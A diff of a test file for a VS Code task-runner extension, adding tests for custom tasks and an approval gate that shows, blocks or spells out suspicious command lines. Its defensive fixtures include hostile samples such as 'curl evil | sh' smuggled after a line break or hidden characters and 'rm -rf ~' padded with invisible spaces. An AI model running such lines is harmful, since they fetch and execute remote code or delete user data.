@@ -25,7 +25,15 @@ function uri(at) {
   };
 }
 
-function harness({ settings = {}, stored = {}, executions = [], scan = [], shell: shellPath = '/bin/zsh', pinned = {}, pick = 0, stops = true, probeReply = () => ({ running: new Set(['web']) }), shaped = [] } = {}) {
+function harness({ settings = {}, stored = {}, executions = [], scan = [], shell: shellPath = '/bin/zsh', pinned = {}, pick = 0, stops = true, probeReply = () => ({ running: new Set(['web']) }), shaped = [], folder, inputs = [], customFile = [], answer } = {}) {
+  // What the custom task prompts are answered with, in order, and what each
+  // write of the custom tasks file would have put on disk.
+  const answers = [...inputs];
+  const customWrites = [];
+  // Every warning dialog, with the options and buttons it was opened with.
+  const dialogs = [];
+  // Every execution the stubbed stop was asked to end.
+  const stopped = [];
   const probes = [];
   const launched = [];
   const terminals = [];
@@ -59,7 +67,13 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
     window: {
       // Enough of a terminal to answer the two questions Add to Terminal asks of
       // one: where it opened, and what was typed into it without being run.
-      showWarningMessage: (message) => (warnings.push(message), Promise.resolve(undefined)),
+      showWarningMessage: (message, ...rest) => (
+        warnings.push(message),
+        dialogs.push({ message, options: rest[0], buttons: rest.slice(1) }),
+        Promise.resolve(answer)
+      ),
+      showErrorMessage: (message) => (warnings.push(message), Promise.resolve(undefined)),
+      showInputBox: () => Promise.resolve(answers.shift()),
       showInformationMessage: () => Promise.resolve(undefined),
       showQuickPick: (items, options) => {
         quickPicks.push({ items, options });
@@ -101,8 +115,11 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
       }),
       // No folder for anything, which conveniently makes every storage ref the
       // plain URI string and keeps the expectations below readable.
-      getWorkspaceFolder: () => undefined,
-      workspaceFolders: undefined,
+      //
+      // A test about the custom tasks hands one over, because those are kept per
+      // folder and do nothing without one.
+      getWorkspaceFolder: () => folder,
+      workspaceFolders: folder ? [folder] : undefined,
       // The real one cuts the workspace root off the front, and names the folder
       // as well when more than one is open. Every path in this file is under
       // `/repo`, so cutting that is the whole of what it has to do here.
@@ -125,9 +142,11 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
     },
     TaskScope: { Workspace: 1 },
     ConfigurationTarget: { Global: 'global', Workspace: 'workspace', WorkspaceFolder: 'folder' },
+    // Both of the real one's shapes: a program and its arguments, or a whole
+    // command line and its options — the second is how a custom task runs.
     ShellExecution: class {
       constructor(command, args, options) {
-        Object.assign(this, { command, args, options });
+        Object.assign(this, Array.isArray(args) ? { command, args, options } : { command, options: args });
       }
     },
     ProcessExecution: class {
@@ -212,6 +231,22 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
             name === './sources'
             ? {
                 ecosystemOf: (kind) => ECOSYSTEMS[kind],
+                CUSTOM_GROUP_NAME: 'Custom Tasks',
+                CUSTOM_TASKS_FILE: '.vscode/task-script-explorer.json',
+                customTasksFile: (at) => uri(`${at.uri.path}/.vscode/task-script-explorer.json`),
+                resetSources: () => {},
+                // The file as `customFile` says it is, handed to the edit the way
+                // the real one hands it over, and what came back recorded.
+                editCustomTasks: async (_folder, edit) => {
+                  const next = edit(customFile.map((entry) => [...entry]));
+                  if (next) {
+                    customWrites.push(next);
+                  }
+                  return next ? JSON.stringify(next) : undefined;
+                },
+                // `null` stands for a file that is there and is not ours to read.
+                readCustomTasks: async () => (customFile === null ? undefined : customFile.map((entry) => [...entry])),
+                readText: async () => undefined,
                 ALL_ECOSYSTEMS: [...new Set(Object.values(ECOSYSTEMS))],
                 collectScripts: async () => scan,
                 emptyManifests: () => [],
@@ -219,7 +254,7 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
                 settingShapedManifests: () =>
                   shaped.map((entry) => (Array.isArray(entry) ? [uri(entry[0]), entry[1]] : [uri(entry), () => true])),
                 scriptKey: (manifest, task) => `${manifest}::${task}`,
-                commandFor: (entry) => (entry.argv ?? [entry.name]).join(' '),
+                commandFor: (entry) => entry.line ?? (entry.argv ?? [entry.name]).join(' '),
                 launchArgv: (entry) => entry.argv ?? [entry.name],
                 // The real test, verbatim: a stub that called everything plain
                 // would leave the quoting below untested.
@@ -240,12 +275,12 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
     confirmScript = async () => true;
     // The real one waits fifteen seconds on a task that will not die. The
     // harness gives that answer straight away, either way round.
-    stopExecution = async () => ${stops};
-    exports.tree = { buildTreeRoots, buildItems, groupedByEcosystem, orderedByHost, dropGroups, savedOrder, hiddenRefs, treeItemFor, iconFor, addToTerminal, runGroup, stopStack, composeActions, buildImage, dockerfileActions, stopGroup, restartGroup, setGrouping, running, containers, checkContainers, recheckAfter, keyForTask, buildTask, stopContainers, pruneStaleRefs, fileBehind, copyPathOf, revealFile, scriptItem, pickColor, pickIcon, PALETTE, SCAN_SETTINGS };
+    stopExecution = async (execution) => (stopped.push(execution), ${stops});
+    exports.tree = { startScript, restartNode, clearance, approveLaunch, createCustomTask, editCustomTask, deleteCustomTask, renameCustomTask, editTitle, buildTreeRoots, buildItems, groupedByEcosystem, orderedByHost, dropGroups, savedOrder, hiddenRefs, treeItemFor, iconFor, addToTerminal, runGroup, stopStack, composeActions, buildImage, dockerfileActions, stopGroup, restartGroup, setGrouping, running, containers, checkContainers, recheckAfter, keyForTask, buildTask, stopContainers, pruneStaleRefs, fileBehind, copyPathOf, revealFile, scriptItem, pickColor, pickIcon, PALETTE, SCAN_SETTINGS };
   `,
-    Object.assign(context, { memento, extUri: uri('/ext') }),
+    Object.assign(context, { memento, extUri: uri('/ext'), stopped }),
   );
-  return { ...context.exports.tree, memento, settings, probes, launched, terminals, writes, warnings, hints, quickPicks, copied, invoked };
+  return { ...context.exports.tree, memento, settings, probes, launched, terminals, writes, warnings, hints, quickPicks, copied, invoked, customWrites, answers, dialogs, stopped };
 }
 
 /** What the stubbed `ecosystemOf` answers — the same map the real one holds. */
@@ -256,6 +291,7 @@ const ECOSYSTEMS = {
   'docker-compose': 'docker',
   dockerfile: 'docker',
   shell: 'shell',
+  custom: 'custom',
 };
 
 function script(manifest, name, kind) {
@@ -303,6 +339,22 @@ const ids = (nodes) => [...nodes].map((node) => (node.kind === 'group' ? node.id
 
 /** The manifest each entry of an ordered list came from, in this realm's Array. */
 const paths = (scripts) => [...scripts].map((entry) => entry.manifest.path);
+
+/** A custom task as `collectCustomTasks` builds one: a line, run from the folder root. */
+function custom(name, line) {
+  return {
+    key: `file:///repo/.vscode/task-script-explorer.json::${name}`,
+    name,
+    command: line,
+    line,
+    manifest: uri('/repo/.vscode/task-script-explorer.json'),
+    kind: 'custom',
+    cwd: uri('/repo'),
+    location: '.vscode/task-script-explorer.json',
+    directory: '.vscode',
+    packageName: 'Custom Tasks',
+  };
+}
 
 const WEB = script('/repo/web/package.json', 'dev', 'npm');
 const ENGINE = script('/repo/engine/Cargo.toml', 'build', 'cargo');
@@ -750,6 +802,9 @@ test('only the commands that work without a row are offered in the palette', () 
     .filter((command) => !hidden.has(`taskRunnerUltimate.${command}`));
   assert.deepEqual(visible.sort(), [
     'checkContainers',
+    // The one row command that needs no row: a task is created into a folder,
+    // and the command asks for one when it is not handed a heading.
+    'createCustomTask',
     'groupByEcosystem',
     'groupFlat',
     'menu',
@@ -2309,4 +2364,398 @@ test('a put-away project takes its script folder with it', async () => {
   ]);
   // The one folder behind the row still leaves the row that folder, pile or not.
   assert.equal(api.children[1].ref, 'file:///repo/api/scripts');
+});
+
+// --- custom tasks ------------------------------------------------------------
+
+const FOLDER = { name: 'repo', uri: uri('/repo'), index: 0 };
+const RESET = custom('Reset DB', 'docker compose down -v && docker compose up -d db');
+const LOGS = custom('Tail logs', 'tail -f logs/*.log | grep ERROR');
+
+test('the custom tasks head the list in flat mode, under a heading of their own', () => {
+  const h = harness({ settings: { grouping: 'flat' }, stored: { groupOrder: ['file:///repo/web/package.json'] } });
+  const roots = h.buildTreeRoots([RESET, LOGS, WEB, ENGINE]);
+  assert.deepEqual(ids(roots), [
+    'group:file:///repo/.vscode/task-script-explorer.json',
+    'group:file:///repo/web/package.json',
+    'group:file:///repo/engine/Cargo.toml',
+  ]);
+  const item = h.treeItemFor(roots[0]);
+  // No `.vscode` after the bullet: the path is the same for every folder's list.
+  assert.equal(item.label, 'Custom Tasks');
+  assert.equal(item.contextValue, 'custom');
+  assert.equal(item.iconPath.id, 'zap');
+});
+
+test('in ecosystem mode the custom tasks stand at the root, not under a parent of their own', () => {
+  const { buildTreeRoots } = harness({ settings: { grouping: 'ecosystem' } });
+  assert.deepEqual(ids(buildTreeRoots([RESET, WEB, API, ENGINE])), [
+    'group:file:///repo/.vscode/task-script-explorer.json',
+    'group:eco:node',
+    'group:eco:rust',
+  ]);
+  // And one package beside them is still one package, with no parent over it.
+  assert.deepEqual(ids(buildTreeRoots([RESET, WEB])), [
+    'group:file:///repo/.vscode/task-script-explorer.json',
+    'group:file:///repo/web/package.json',
+  ]);
+});
+
+test('the saved order puts the custom tasks first whatever the heading order says', async () => {
+  const h = harness({
+    scan: [WEB, ENGINE, RESET],
+    stored: {
+      groupOrder: [
+        'file:///repo/web/package.json',
+        'file:///repo/engine/Cargo.toml',
+        'file:///repo/.vscode/task-script-explorer.json',
+      ],
+    },
+  });
+  assert.deepEqual(paths(await h.savedOrder()), [
+    '/repo/.vscode/task-script-explorer.json',
+    '/repo/web/package.json',
+    '/repo/engine/Cargo.toml',
+  ]);
+});
+
+test('a custom task row says what it is, and takes the + only on its heading', () => {
+  const h = harness({});
+  const row = h.treeItemFor({ kind: 'script', script: RESET }).contextValue;
+  assert.equal(row, 'script:idle:nofav:custom:noconfirm');
+  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '../package.json'), 'utf8'));
+  const when = (command, group) =>
+    manifest.contributes.menus['view/item/context']
+      .filter((entry) => entry.command === `taskRunnerUltimate.${command}` && (!group || entry.group.startsWith(group)))
+      .map((entry) => new RegExp(entry.when.match(/viewItem =~ \/(.+)\/$/)[1]));
+  const offered = (command, value, group) => when(command, group).some((pattern) => pattern.test(value));
+  // Edit and Delete are a custom task's alone.
+  assert.equal(offered('editCustomTask', row), true);
+  assert.equal(offered('deleteCustomTask', row), true);
+  assert.equal(offered('editCustomTask', 'script:idle:nofav:task:noconfirm'), false);
+  assert.equal(offered('deleteCustomTask', 'script:idle:nofav:shell:noconfirm'), false);
+  // Add to Terminal reaches them, as it does a shell row.
+  assert.equal(offered('addToTerminal', row), true);
+  // The + is on the heading in every state, and on no other heading.
+  for (const value of ['custom', 'custom:running', 'custom:hidden', 'custom:carried:running']) {
+    assert.equal(offered('createCustomTask', value, 'inline'), true, value);
+  }
+  assert.equal(offered('createCustomTask', 'group:package', 'inline'), false);
+  // The heading keeps what every file heading has: open it, hide it, stop what runs.
+  assert.equal(offered('openManifest', 'custom'), true);
+  assert.equal(offered('hideGroup', 'custom'), true);
+  assert.equal(offered('stopGroup', 'custom:running'), true);
+});
+
+test('a custom task goes to the shell as one line, as it was typed', () => {
+  const h = harness({});
+  const task = h.buildTask(LOGS);
+  // Not an argv: quoting the line word by word would run a program called
+  // `tail -f logs/*.log | grep ERROR`.
+  assert.equal(task.execution.command, 'tail -f logs/*.log | grep ERROR');
+  assert.equal(task.execution.args, undefined);
+  assert.equal(task.execution.options.cwd, '/repo');
+  // No `(.vscode/task-script-explorer.json)` after the name: it is every row's.
+  assert.equal(task.name, 'Tail logs');
+});
+
+test('Add to Terminal types a custom task back exactly as it was written', async () => {
+  const h = harness({});
+  await h.addToTerminal({ kind: 'script', script: RESET });
+  assert.deepEqual(h.terminals[0].sent, [
+    { text: 'docker compose down -v && docker compose up -d db', execute: false },
+  ]);
+});
+
+test('a new custom task is added at the end of its folder\'s list', async () => {
+  const h = harness({ folder: FOLDER, scan: [RESET], customFile: [['Reset DB', RESET.line]], inputs: ['  Build  ', ' make build '] });
+  await h.createCustomTask(undefined);
+  assert.deepEqual(h.customWrites.map((tasks) => [...tasks].map((entry) => [...entry])), [
+    [
+      ['Reset DB', RESET.line],
+      ['Build', 'make build'],
+    ],
+  ]);
+});
+
+test('creating a task stops at the first prompt left empty, and writes nothing', async () => {
+  const h = harness({ folder: FOLDER, inputs: ['Build', undefined] });
+  await h.createCustomTask(undefined);
+  assert.equal(h.customWrites.length, 0);
+});
+
+test('a name the file already holds is not written twice', async () => {
+  // The prompt checks against the last scan; the file is checked as it is now.
+  const h = harness({ folder: FOLDER, scan: [], customFile: [['Build', 'make']], inputs: ['Build', 'make all'] });
+  await h.createCustomTask(undefined);
+  assert.equal(h.customWrites.length, 0);
+});
+
+test('Edit Command rewrites the line and leaves the rest of the file where it was', async () => {
+  const h = harness({
+    folder: FOLDER,
+    customFile: [
+      ['Reset DB', RESET.line],
+      ['Tail logs', LOGS.line],
+    ],
+    inputs: ['docker compose down && docker compose up -d'],
+  });
+  await h.editCustomTask({ kind: 'script', script: RESET });
+  assert.deepEqual(h.customWrites.map((tasks) => [...tasks].map((entry) => [...entry])), [
+    [
+      ['Reset DB', 'docker compose down && docker compose up -d'],
+      ['Tail logs', LOGS.line],
+    ],
+  ]);
+});
+
+test('Rename on a custom task renames it, and takes its star and colour along', async () => {
+  const from = 'repo/.vscode/task-script-explorer.json::Reset DB';
+  const to = 'repo/.vscode/task-script-explorer.json::Fresh DB';
+  const h = harness({
+    folder: FOLDER,
+    scan: [RESET, LOGS],
+    customFile: [
+      ['Reset DB', RESET.line],
+      ['Tail logs', LOGS.line],
+    ],
+    inputs: ['Fresh DB'],
+    stored: {
+      favorites: [from],
+      colors: { [from]: 'red' },
+      approvals: { [from]: RESET.line },
+      order: { 'repo/.vscode/task-script-explorer.json': ['repo/.vscode/task-script-explorer.json::Tail logs', from] },
+    },
+  });
+  // Through the menu's own command: a custom row's Rename is a real one.
+  await h.editTitle({ kind: 'script', script: RESET });
+  assert.deepEqual(h.customWrites.map((tasks) => [...tasks].map((entry) => [...entry])), [
+    [
+      ['Fresh DB', RESET.line],
+      ['Tail logs', LOGS.line],
+    ],
+  ]);
+  assert.deepEqual([...h.memento.data.favorites], [to]);
+  assert.deepEqual({ ...h.memento.data.colors }, { [to]: 'red' });
+  // Renamed in the tree, so still approved: what runs has not changed.
+  assert.deepEqual({ ...h.memento.data.approvals }, { [to]: RESET.line });
+  assert.deepEqual([...h.memento.data.order['repo/.vscode/task-script-explorer.json']], [
+    'repo/.vscode/task-script-explorer.json::Tail logs',
+    to,
+  ]);
+  // And no display title was laid over it: the name itself changed.
+  assert.equal(h.memento.data.titles, undefined);
+});
+
+test('a running custom task is not renamed out from under its terminal', async () => {
+  const h = harness({ folder: FOLDER, scan: [RESET], customFile: [['Reset DB', RESET.line]], inputs: ['Fresh DB'] });
+  h.running.set(RESET.key, { task: { name: 'Reset DB' } });
+  await h.renameCustomTask(RESET);
+  assert.equal(h.customWrites.length, 0);
+  assert.match(h.warnings[0], /Stop "Reset DB"/);
+});
+
+test('Delete takes a custom task out of its file only once it is confirmed', async () => {
+  const file = [
+    ['Reset DB', RESET.line],
+    ['Tail logs', LOGS.line],
+  ];
+  const declined = harness({ folder: FOLDER, customFile: file });
+  await declined.deleteCustomTask({ kind: 'script', script: RESET });
+  assert.equal(declined.customWrites.length, 0);
+
+  const confirmed = harness({ folder: FOLDER, customFile: file, answer: 'Delete' });
+  await confirmed.deleteCustomTask({ kind: 'script', script: RESET });
+  assert.deepEqual(confirmed.customWrites.map((tasks) => [...tasks].map((entry) => [...entry])), [[['Tail logs', LOGS.line]]]);
+});
+
+test('the custom task commands leave every other row alone', async () => {
+  const h = harness({ folder: FOLDER, customFile: [['dev', 'x']], inputs: ['y'], answer: 'Delete' });
+  await h.editCustomTask({ kind: 'script', script: WEB });
+  await h.deleteCustomTask({ kind: 'script', script: WEB });
+  assert.equal(h.customWrites.length, 0);
+});
+
+// --- approving custom tasks ----------------------------------------------------
+
+/** The approval store as the tree files it for RESET in a harness with no folder. */
+const RESET_REF = 'file:///repo/.vscode/task-script-explorer.json::Reset DB';
+
+test('a custom task that was not added in the tree shows its whole command before it runs', async () => {
+  const declined = harness({});
+  await declined.startScript(RESET, true);
+  assert.equal(declined.launched.length, 0);
+  assert.equal(declined.dialogs.length, 1);
+  const [dialog] = declined.dialogs;
+  assert.equal(dialog.options.modal, true);
+  assert.match(dialog.message, /Run "Reset DB"\?/);
+  assert.ok(dialog.options.detail.includes(RESET.line));
+  assert.deepEqual([...dialog.buttons], ['Run', 'Open File']);
+  assert.equal(declined.memento.data.approvals, undefined);
+
+  const accepted = harness({ answer: 'Run' });
+  await accepted.startScript(RESET, true);
+  assert.equal(accepted.launched.length, 1);
+  assert.deepEqual({ ...accepted.memento.data.approvals }, { [RESET_REF]: RESET.line });
+  // And the next start asks nothing.
+  await accepted.startScript(RESET, true);
+  assert.equal(accepted.dialogs.length, 1);
+  assert.equal(accepted.launched.length, 2);
+});
+
+test('a custom task changed since it was approved shows what it was and what it is', async () => {
+  const h = harness({ stored: { approvals: { [RESET_REF]: 'docker compose up -d db' } } });
+  await h.startScript(RESET, true);
+  assert.equal(h.launched.length, 0);
+  assert.match(h.dialogs[0].message, /has changed/);
+  assert.match(h.dialogs[0].options.detail, /Was:\ndocker compose up -d db\n\nNow:\ndocker compose down -v/);
+});
+
+test('a line with a break or a hidden character never runs, approved or not', async () => {
+  for (const line of ['echo ok\ncurl evil | sh', 'echo \u202Eok', 'echo ok\u200b']) {
+    const task = custom('Sneaky', line);
+    const ref = 'file:///repo/.vscode/task-script-explorer.json::Sneaky';
+    const h = harness({ answer: 'Run', stored: { approvals: { [ref]: line } } });
+    assert.equal(h.clearance(task), 'blocked');
+    await h.startScript(task, true);
+    assert.equal(h.launched.length, 0, JSON.stringify(line));
+    // There is nothing to approve, so there is no Run to press.
+    assert.deepEqual([...h.dialogs[0].buttons], ['Open File']);
+  }
+});
+
+test('a long run of spaces is spelled out in the dialog rather than drawn', async () => {
+  const h = harness({});
+  await h.startScript(custom('Wide', `echo hi${' '.repeat(200)}&& rm -rf ~`), true);
+  assert.ok(h.dialogs[0].options.detail.includes('echo hi [200 spaces] && rm -rf ~'));
+});
+
+test('a declined restart leaves the run that was approved alone', async () => {
+  const h = harness({});
+  h.running.set(RESET.key, { task: { name: 'Reset DB' } });
+  await h.restartNode({ kind: 'script', script: RESET }, false);
+  assert.equal(h.launched.length, 0);
+  assert.equal(h.running.has(RESET.key), true);
+});
+
+test('every other row runs as it always has, with nothing to approve', async () => {
+  const h = harness({});
+  assert.equal(h.clearance(WEB), 'approved');
+  await h.startScript(WEB, true);
+  assert.equal(h.dialogs.length, 0);
+  assert.equal(h.launched.length, 1);
+});
+
+test('a task made in the tree is approved as it is saved', async () => {
+  const h = harness({ folder: FOLDER, inputs: ['Build', 'make build'] });
+  await h.createCustomTask(undefined);
+  assert.deepEqual({ ...h.memento.data.approvals }, { 'repo/.vscode/task-script-explorer.json::Build': 'make build' });
+});
+
+test('an edited command is approved as it is saved', async () => {
+  const h = harness({ folder: FOLDER, customFile: [['Reset DB', RESET.line]], inputs: ['make reset'] });
+  await h.editCustomTask({ kind: 'script', script: RESET });
+  assert.deepEqual({ ...h.memento.data.approvals }, { 'repo/.vscode/task-script-explorer.json::Reset DB': 'make reset' });
+});
+
+test('an unapproved row says so before it is clicked', () => {
+  const h = harness({ stored: { approvals: { [RESET_REF]: RESET.line } } });
+  const approved = h.treeItemFor({ kind: 'script', script: RESET });
+  assert.doesNotMatch(approved.description, /not approved/);
+  const pending = h.treeItemFor({ kind: 'script', script: LOGS });
+  assert.match(pending.description, /^not approved · /);
+  assert.equal(pending.iconPath.id, 'shield');
+  assert.match(pending.tooltip, /asks before it runs/);
+  const blocked = h.treeItemFor({ kind: 'script', script: custom('Sneaky', 'a\nb') });
+  assert.match(blocked.description, /^blocked · /);
+  assert.equal(blocked.iconPath.id, 'error');
+  // The dropdown says it too.
+  assert.match(h.scriptItem(LOGS, false).label, /^\$\(shield\) /);
+});
+
+test('the approval of a task deleted from its file is forgotten', async () => {
+  const gone = 'file:///repo/.vscode/task-script-explorer.json::Gone';
+  const h = harness({ stored: { approvals: { [RESET_REF]: RESET.line, [gone]: 'echo gone' } } });
+  await h.pruneStaleRefs([RESET]);
+  assert.deepEqual({ ...h.memento.data.approvals }, { [RESET_REF]: RESET.line });
+});
+
+test('Add to Terminal refuses a blocked custom task, whose line break would be an Enter', async () => {
+  const h = harness({});
+  await h.addToTerminal({ kind: 'script', script: custom('Sneaky', 'echo ok\ncurl evil | sh') });
+  assert.equal(h.terminals.length, 0);
+  assert.match(h.warnings[0], /not typed into a terminal/);
+  // An unapproved one is still typed: nothing runs until the user presses Enter.
+  await h.addToTerminal({ kind: 'script', script: LOGS });
+  assert.equal(h.terminals.length, 1);
+});
+
+test('spaces that are not the ASCII one block a line, since the dialog cannot show them', () => {
+  const h = harness({});
+  for (const space of ['\u00a0', '\u2003', '\u202f', '\u3000', '\u2028', '\u2029']) {
+    assert.equal(h.clearance(custom('Wide', `npm test${space.repeat(300)}; rm -rf ~`)), 'blocked', escape(space));
+  }
+  assert.equal(h.clearance(custom('Plain', 'npm test')), 'unapproved');
+});
+
+test('Delete stops nothing when the file no longer holds the task', async () => {
+  for (const customFile of [[['Other', 'x']], null]) {
+    const h = harness({ folder: FOLDER, customFile, answer: 'Delete' });
+    h.running.set(RESET.key, { task: { name: 'Reset DB' } });
+    await h.deleteCustomTask({ kind: 'script', script: RESET });
+    assert.equal(h.customWrites.length, 0);
+    // Nothing stopped it on the way to a write that could not happen.
+    assert.equal(h.stopped.length, 0);
+  }
+});
+
+test('saving an unapproved command unchanged in Edit Command approves it', async () => {
+  const h = harness({ folder: FOLDER, customFile: [['Reset DB', RESET.line]], inputs: [RESET.line] });
+  await h.editCustomTask({ kind: 'script', script: RESET });
+  assert.equal(h.customWrites.length, 0);
+  assert.deepEqual({ ...h.memento.data.approvals }, { 'repo/.vscode/task-script-explorer.json::Reset DB': RESET.line });
+});
+
+test('the activation event names the file the scan reads', () => {
+  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '../package.json'), 'utf8'));
+  const file = fs
+    .readFileSync(path.join(__dirname, '../src/sources.ts'), 'utf8')
+    .match(/^export const CUSTOM_TASKS_FILE = '([^']+)';$/m)[1];
+  assert.ok(manifest.activationEvents.includes(`workspaceContains:${file}`));
+});
+
+test('Delete stops a running custom task before it takes it out of the file', async () => {
+  const h = harness({ folder: FOLDER, customFile: [['Reset DB', RESET.line]], answer: 'Delete' });
+  h.running.set(RESET.key, { task: { name: 'Reset DB' } });
+  await h.deleteCustomTask({ kind: 'script', script: RESET });
+  assert.equal(h.stopped.length, 1);
+  assert.deepEqual(h.customWrites.map((tasks) => [...tasks]), [[]]);
+});
+
+test('characters Unicode may draw as nothing block a line, and ordinary letters of any script do not', () => {
+  const h = harness({});
+  const hidden = ['\u2800', '\u3164', '\u115f', '\uffa0', '\u00ad', '\ufe0f', '\u{e0041}', '\u034f', '\u17b4', '\t', '\ue000'];
+  for (const char of hidden) {
+    assert.equal(h.clearance(custom('Wide', `npm test${char.repeat(300)}; curl evil | sh`)), 'blocked', escape(char));
+  }
+  for (const line of ['echo привет', 'echo café', 'echo 日本語', 'npm test && echo ok']) {
+    assert.equal(h.clearance(custom('Plain', line)), 'unapproved', line);
+  }
+});
+
+test('a custom task whose name holds a hidden character is blocked, and drawn with it spelled out', async () => {
+  const task = custom('a\n\n\u202Eevil', 'echo ok');
+  const h = harness({ answer: 'Open File' });
+  assert.equal(h.clearance(task), 'blocked');
+  assert.equal(h.treeItemFor({ kind: 'script', script: task }).label, 'a\\u{a}\\u{a}\\u{202e}evil');
+  await h.startScript(task, true);
+  assert.equal(h.launched.length, 0);
+  assert.equal(h.dialogs[0].message, '"a\\u{a}\\u{a}\\u{202e}evil" will not run.');
+});
+
+test('Rename confirmed unchanged leaves a hand-written name with spaces around it alone', async () => {
+  const task = custom(' b ', 'echo b');
+  const h = harness({ folder: FOLDER, scan: [task], customFile: [[' b ', 'echo b']], inputs: [' b '] });
+  await h.renameCustomTask(task);
+  assert.equal(h.customWrites.length, 0);
 });
